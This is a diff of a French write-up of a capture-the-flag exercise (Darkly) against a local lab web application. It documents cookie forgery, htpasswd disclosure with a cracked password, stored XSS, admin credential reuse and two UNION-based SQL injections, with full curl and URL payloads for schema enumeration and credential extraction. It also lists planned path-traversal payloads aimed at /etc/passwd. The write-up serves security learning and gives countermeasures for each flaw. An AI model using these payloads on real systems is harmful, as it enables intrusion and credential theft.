@@ -49,11 +49,6 @@ Disallow: /.hidden
 - Listing de répertoire activé
 - Contient 26 dossiers (un par lettre) + README
 - Structure labyrinthique récursive → **rabbit hole** (à confirmer plus tard, mis en standby)
-- README racine : "Tu veux de l'aide ? Moi aussi !" → troll
-- Les 26 README de niveau 1 contiennent tous des indications contradictoires ("voisin de droite/gauche/dessus/dessous") → probablement destiné à faire perdre du temps
-
-### sitemap.xml
-- [ ] À tester
 
 ### Gobuster
 - 🟡 En cours : wordlist custom créée, scan à relancer avec `--exclude-length 975` (le serveur renvoie 200 sur toutes URLs inexistantes, taille fixe = page 404 déguisée par index.php)
@@ -73,8 +68,6 @@ Cracké via CrackStation. Forge de md5("true") → flag affiché.
 $ echo -n "false" | md5sum   → confirme md5(false)
 $ echo -n "true"  | md5sum   → b326b5062b2f0e69046810717534cb09
 
-→ Détail complet : `01_Cookie_Manipulation/Resources/description.md`
-
 ---
 
 ## Breach #2 — Hidden Page / Information Disclosure
@@ -90,12 +83,6 @@ La page sert directement un `<script>alert('Good job! Flag : ...')</script>` en 
 ### Faille exploitée
 - **Security Through Obscurity** : le dev a cru cacher la page en la nommant avec un hash improbable.
 - **Information Disclosure** : le lien est laissé visible dans le HTML du footer, accessible via Ctrl+U ou clic.
-
-### Méthode
-1. Ctrl+U sur la page d'accueil
-2. Recherche de liens suspects dans le code source
-3. Lien trouvé dans la balise `<ul class="copyright">` du footer
-4. Clic → flag affiché via JS alert
 
 ### Règle violée
 > L'URL n'est pas un secret. Toute ressource non protégée par authentification est publique.
@@ -116,19 +103,12 @@ Le fichier contient un couple `user:hash` avec un hash MD5 non salé, cracké en
 3. `curl http://127.0.0.1:8080/whatever/htpasswd` → `root:437394baff5aa33daa618be47b75cb49`
 4. Identification du hash : 32 hexa = MD5
 5. Crack via CrackStation → `437394baff5aa33daa618be47b75cb49` = `qwerty123@`
-6. Vérification locale :
-   $ echo -n "qwerty123@" | md5sum
-   → 437394baff5aa33daa618be47b75cb49
 
 ### Failles cumulées
 - **Security Misconfiguration** — Directory listing actif sur un répertoire contenant des secrets
 - **Information Disclosure via robots.txt** — le dev a listé explicitement ses chemins sensibles
 - **Cryptographic Failure** — hash MD5 non salé pour stocker un mot de passe
 - **Weak Password** — "qwerty123@" cassable en < 1 seconde (présent dans rockyou.txt)
-
-### Règles violées
-> robots.txt n'est pas un mécanisme de sécurité. C'est une indication pour les crawlers, pas une protection d'accès.
-> MD5 non salé ne doit jamais être utilisé pour stocker des mots de passe en 2026.
 
 ---
 
@@ -137,22 +117,17 @@ Le fichier contient un couple `user:hash` avec un hash MD5 non salé, cracké en
 **Dossier :** `04_Stored_XSS/`
 
 ### Résumé
-Injection d'un payload `<script>alert(...)</script>` dans un formulaire. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu de la page.
+Injection d'un payload `<script>alert(...)</script>` dans le formulaire `?page=feedback`. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu de la page.
 
 ### Méthode
 1. Champ vulnérable identifié sur `?page=feedback`
 2. Payload injecté : `<script>alert('XSS')</script>`
-3. Submit
-4. Au reload de la page, le script s'exécute → flag affiché
+3. Submit → reload → script exécuté → flag affiché
 
 ### Faille exploitée
 - **Stored XSS (OWASP A03:2021 — Injection)**
 - Absence de sanitization à l'entrée
 - Absence d'output encoding à la sortie (pas de `htmlspecialchars()` côté PHP)
-
-### Différence Stored vs Reflected
-- **Reflected** : payload dans l'URL, exécuté une seule fois pour la victime cliquant le lien
-- **Stored** : payload sauvegardé en base, exécuté pour **chaque visiteur** de la page → bien plus dangereux
 
 ### Contre-mesures
 - `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` à l'affichage (PHP)
@@ -170,41 +145,160 @@ Injection d'un payload `<script>alert(...)</script>` dans un formulaire. Le serv
 Découverte d'une zone admin `/admin/` accessible directement sans Basic Auth, contenant un formulaire de login. Les credentials récupérés au breach #3 (`root:qwerty123@`) sont valides → flag.
 
 ### Méthode
-1. Découverte du chemin `/admin/` (test direct du chemin physique, hors routeur `?page=`)
-2. Vérification : `curl http://127.0.0.1:8080/admin/` → renvoie le formulaire de login (200, pas de Basic Auth)
-3. Soumission des creds htpasswd via POST :
+1. Test du chemin physique `/admin/` (hors routeur `?page=`)
+2. `curl http://127.0.0.1:8080/admin/` → formulaire de login (200, pas de Basic Auth)
+3. POST des creds htpasswd :
    ```
    curl -X POST http://127.0.0.1:8080/admin/ \
-     -d "username=root&password=qwerty123@&Login=Login" \
-     -c cookies.txt -b cookies.txt -L
+     -d "username=root&password=qwerty123@&Login=Login"
    ```
 4. Réponse : `<h2>The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff</h2>`
 
-### Architecture défaillante observée
+### Architecture défaillante
 Deux systèmes de routing parallèles sur le même serveur :
-- **`?page=X`** → routeur PHP custom via `index.php` (controllers internes)
-- **`/admin/`** → chemin physique servi directement par nginx (dossier réel sur filesystem)
+- **`?page=X`** → routeur PHP via `index.php`
+- **`/admin/`** → chemin physique servi directement par nginx
 
-La zone `/admin/` est **isolée du routeur principal**, donc échappe aux éventuels middlewares de sécurité côté PHP. Cumul de fautes :
-- Le htpasswd existe mais n'est **pas configuré dans nginx** pour protéger réellement le chemin
-- Le formulaire PHP valide les creds en dur contre le **même couple** que celui exposé publiquement
-- Aucun rate limiting, aucun lockout, aucune 2FA
-- Typo dans le HTML (`recquired` au lieu de `required`) → indicateur de code amateur
+La zone `/admin/` échappe aux middlewares du routeur principal. Cumul de fautes :
+- Le htpasswd existe mais n'est pas configuré dans nginx (`auth_basic` absent)
+- Le formulaire PHP valide en dur contre les **mêmes creds** que ceux exposés publiquement
+- Aucun rate limiting, aucune 2FA
+- Typo `recquired` → indicateur de code amateur
 
 ### Failles cumulées
-- **A07:2021 — Identification and Authentication Failures** (credential reuse, single factor)
+- **A07:2021 — Identification and Authentication Failures** (credential reuse)
 - **A05:2021 — Security Misconfiguration** (htpasswd non appliqué côté serveur)
-- **Defense in depth absent** : un seul couple user/pass protège tout, et il a déjà fuité
-
-### Règle violée
-> Une zone admin doit être protégée par plusieurs couches indépendantes (network ACL, Basic Auth serveur, auth applicative, 2FA). Réutiliser le même secret entre deux mécanismes annule l'effet de la défense en profondeur.
 
 ### Contre-mesures
-- Activer la directive nginx `auth_basic` + `auth_basic_user_file` sur `/admin/`
-- Stocker le htpasswd **hors du document root** (`/etc/nginx/.htpasswd` plutôt que `/var/www/html/whatever/`)
-- Utiliser bcrypt/argon2 au lieu de MD5 dans le htpasswd (`htpasswd -B`)
-- Implémenter rate limiting (`limit_req` nginx) sur les endpoints d'auth
-- 2FA TOTP via lib comme RobThree/TwoFactorAuth
+- nginx : `auth_basic` + `auth_basic_user_file` sur `/admin/`
+- Stocker htpasswd **hors document root** (`/etc/nginx/.htpasswd`)
+- bcrypt au lieu de MD5 (`htpasswd -B`)
+- Rate limiting via `limit_req` nginx
+- 2FA TOTP côté applicatif
+
+---
+
+## Breach #6 — SQLi UNION-Based sur `?page=member`
+**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+**Dossier :** `06_SQLi_Member/`
+
+### Résumé
+Injection SQL UNION-based sur le param `id` de `?page=member`. Énumération du schéma via `information_schema`, extraction des credentials de la table `users`, crack MD5 → transformation lower + SHA256 = flag.
+
+### Méthode complète
+
+**1. Détection de l'injection**
+```
+curl -s "http://127.0.0.1:8080/?page=member&id=1&Submit=Submit"
+→ ID: 1 - First name: one - Surname: me
+
+curl -s "http://127.0.0.1:8080/?page=member&id=1%27&Submit=Submit"
+→ "You have an error in your SQL syntax... near '\''" (MariaDB error visible)
+
+curl -s "http://127.0.0.1:8080/?page=member&id=1+OR+1%3D1&Submit=Submit"
+→ Retourne TOUS les enregistrements (dont "First name: Flag - Surname: GetThe")
+```
+
+**2. Énumération du nombre de colonnes (ORDER BY)**
+```
+?id=1+ORDER+BY+1--+   → OK
+?id=1+ORDER+BY+2--+   → OK
+?id=1+ORDER+BY+3--+   → "Unknown column '3' in 'order clause'"
+```
+→ Requête à **2 colonnes**.
+
+**3. Mapping des colonnes via UNION SELECT**
+```
+?id=0+UNION+SELECT+1,2--+
+→ First name: 1 - Surname: 2
+```
+
+**4. Énumération du schéma**
+```
+?id=0+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema=database()--+
+```
+Table `users` avec colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, **`countersign`** ← suspect.
+
+**5. Extraction des credentials**
+```
+?id=0+UNION+SELECT+countersign,Commentaire+FROM+users--+
+```
+4 hashes MD5 + commentaires. Le 4e contient l'indice :
+> `5ff9d0165b4f92b14994e5c685cdce28`
+> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
+
+**6. Crack et transformation**
+- CrackStation : `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
+- Lower : `fortytwo`
+- SHA-256 : `echo -n "fortytwo" | sha256sum` → `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+
+### Failles exploitées
+- **A03:2021 — Injection (SQLi)** : aucune préparation/échappement du param `id`
+- **Verbose error messages** : MariaDB renvoie l'erreur SQL complète au client
+- **Cryptographic Failure** : MD5 non salé pour stocker des mots de passe
+- **Information Disclosure** : indice du flag stocké en clair dans la base
+
+### Contre-mesures
+- Requêtes préparées (PDO en PHP) : `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")`
+- Cast strict du param : `intval($_GET['id'])`
+- Désactiver les erreurs SQL en production (`display_errors = Off`)
+- bcrypt/argon2 pour stocker des mots de passe
+- Principe du moindre privilège sur le compte MySQL applicatif
+
+---
+
+## Breach #7 — SQLi UNION-Based sur `?page=searchimg`
+**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+**Dossier :** `07_SQLi_SearchImg/`
+
+### Résumé
+Même pattern que breach #6 mais sur un autre endpoint. SQLi UNION sur `?page=searchimg&id=`. La base utilisée est **différente** de celle de `?page=member` — le serveur fait un `mysql_select_db()` différent selon la page.
+
+### Méthode
+
+**1. Détection silencieuse**
+Pas d'erreur SQL visible (au contraire de member), mais comportement différent :
+```
+?id=1&Submit=Submit                    → ID: 1 - Title: Nsa - Url : ...
+?id=1+ORDER+BY+1--+&Submit=Submit      → OK
+?id=1+ORDER+BY+2--+&Submit=Submit      → OK
+?id=1+ORDER+BY+3--+&Submit=Submit      → résultat vide (injection plante silencieusement)`
+```
+→ 2 colonnes, mais erreurs supprimées côté display.
+
+**2. Confirmation UNION**
+```
+?id=0+UNION+SELECT+1,2--+&Submit=Submit
+→ Title: 2 - Url: 1   (mapping: col1 = Url, col2 = Title)
+```
+
+**3. Énumération du schéma**
+```
+?id=0+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_schema=database()--+
+```
+**Une seule table** : `list_images` avec colonnes `id`, `url`, `title`, `comment`.
+
+→ Découverte importante : cette base est **différente** de celle de breach #6 (qui contient `users`). Donc 2 databases distinctes côté serveur.
+
+**4. Extraction du contenu**
+```
+?id=0+UNION+SELECT+comment,title+FROM+list_images--+
+```
+5 enregistrements. Le 5e contient l'indice :
+> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+
+**5. Crack et transformation**
+- CrackStation : `1928e8083cf461a51303633093573c46` → `albatroz`
+- Lower : `albatroz` (déjà en minuscules)
+- SHA-256 : `echo -n "albatroz" | sha256sum` → `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
+
+### Différences avec breach #6
+- **Erreurs SQL masquées** : Darkly a appliqué `display_errors = Off` sur cette page mais pas sur member → incohérence de hardening
+- **Database différente** : preuve que le serveur fait du `mysql_select_db()` dynamique → architecture multi-base
+- **Indice directement dans `comment`** : la table contenait littéralement les instructions du flag
+
+### Leçon méthodologique
+Toutes les colonnes de toutes les tables doivent être dump dans un pentest. Les indices (et secrets) se cachent souvent dans `comment`, `description`, `notes`, `metadata`, `meta`, `info`.
 
 ---
 
@@ -216,26 +310,28 @@ La zone `/admin/` est **isolée du routeur principal**, donc échappe aux évent
 | 3 | Htpasswd Disclosure | ✅ Credentials exploités au #5 |
 | 4 | Stored XSS | ✅ Flag validé |
 | 5 | Admin Auth Bypass | ✅ Flag validé |
-| 6-14 | — | À explorer |
+| 6 | SQLi UNION sur `?page=member` | ✅ Flag validé |
+| 7 | SQLi UNION sur `?page=searchimg` | ✅ Flag validé |
+| 8-14 | — | À explorer |
 
-**Score : 5/14**
+**Score : 7/14**
 
 ---
 
 ## Prochaines pistes à tester (ordre de priorité)
 
 ### Priorité haute — ROI immédiat
-- [ ] **SQLi sur `?page=signin`** : auth bypass classique (`admin'-- `, `' OR 1=1-- `)
-- [ ] **SQLi UNION sur `?page=member`** (Search Member) : extraction via `information_schema`
-- [ ] **Path Traversal sur `?page=media&src=`** : `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index`
+- [ ] **Open Redirect sur `?page=redirect&site=`** : tester URL externe arbitraire
+- [ ] **Path Traversal sur `?page=media&src=`** : filtre détecté (refuse `php://filter`), tester `../`, encodage URL
+- [ ] **File Upload sur `?page=upload`** : upload accepte les vraies images, mais aucun flag affiché → critère caché à identifier
 
 ### Priorité moyenne
-- [ ] **Open Redirect sur `?page=redirect&site=`** : tester URL externe arbitraire
-- [ ] **File Upload bypass sur `?page=upload`** : extension/MIME/magic bytes
-- [ ] **Reflected XSS sur `?page=searchimg`** : payload dans param de recherche
+- [ ] **Reflected XSS sur `?page=searchimg`** : payload dans param `id` (en plus de la SQLi déjà exploitée)
+- [ ] **`?page=recover`** : SQLi probable, non testé
+- [ ] **`?page=survey`** : non exploré
 
 ### Priorité basse / parallèle
-- [ ] **Gobuster** : finir le scan avec `--exclude-length 975` pour mapper les chemins physiques restants
+- [ ] **Gobuster** : finir le scan avec `--exclude-length 975`
 - [ ] **`.hidden/` parsing** : `wget -r` + grep récursif (bypass du rabbit hole textuel)
 - [ ] **sitemap.xml** : vérification rapide
 
@@ -247,3 +343,8 @@ La zone `/admin/` est **isolée du routeur principal**, donc échappe aux évent
 3. **MD5 et SHA-1 sont morts** pour le stockage de mots de passe. CrackStation casse en secondes.
 4. **Security through obscurity ≠ sécurité** : breach #2 et #5 démontrent que cacher un chemin n'est pas une protection.
 5. **Credential reuse** = faille systémique. Un seul secret exposé compromet tous les systèmes qui le réutilisent.
+6. **Méthode SQLi UNION-based** : (1) détecter avec `'`, (2) compter les colonnes via `ORDER BY`, (3) mapper via `UNION SELECT 1,2,...`, (4) énumérer schéma via `information_schema`, (5) extraire les colonnes intéressantes (passwords, comments, secrets).
+7. **Verbose error messages** = fuite d'information critique. Une erreur SQL complète révèle le SGBD, la version, la structure de la requête.
+8. **Multi-base = surface d'attaque démultipliée** : un même serveur peut servir plusieurs databases différentes selon la page → toujours énumérer le schéma sur **chaque** point d'injection.
+9. **Pattern Darkly récurrent** : MD5 → CrackStation → lower → SHA-256 = flag. À tester systématiquement quand un hash est extrait.
+10. **Toutes les colonnes valent le dump** : indices et secrets se cachent souvent dans `comment`, `description`, `notes`, `metadata`.
